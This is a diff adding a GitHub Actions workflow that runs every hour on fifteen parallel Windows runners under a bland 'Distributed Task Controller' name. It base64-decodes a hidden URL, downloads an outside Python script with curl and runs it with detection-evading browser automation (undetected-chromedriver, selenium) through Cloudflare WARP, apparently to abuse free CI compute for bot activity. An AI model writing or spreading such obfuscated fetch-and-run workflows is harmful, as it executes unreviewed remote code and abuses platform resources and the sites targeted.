@@ -1,0 +1,70 @@
+name: Distributed Task Controller
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: process-group-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-nodes:
+    name: "Runner-${{ matrix.slot_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        slot_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+
+    steps:
+      - name: Initialize Environment & Fetch Dependencies
+        shell: bash
+        run: |
+          echo "[START] Bootstrapping Runner-${{ matrix.slot_id }}..."
+          
+          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
+          ENDPOINT_PAYLOAD=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS92YXovcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$ENDPOINT_PAYLOAD" -o runner_script.py
+          
+          echo "[SETUP] Installing required modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[SETUP] Dependency installation complete."
+
+      - name: Run Script & Enforce Timeout
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Starting task script on slot ${{ matrix.slot_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ExecutionParams = @{
+              FilePath     = "python"
+              ArgumentList = "runner_script.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $WorkerProc = Start-Process @ExecutionParams
+          
+          Write-Output ">>> Process monitor engaged. Limit: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Script finished naturally."
+          }
+          catch {
+              Write-Output ">>> Timeout reached. Terminating process instance..."
+              Stop-Process -InputObject $WorkerProc -Force
+              Write-Output ">>> Process stopped by monitor."
+          }
+
+      - name: Finalize Step
+        shell: bash
+        run: echo "[DONE] Runner-${{ matrix.slot_id }} execution finalized."
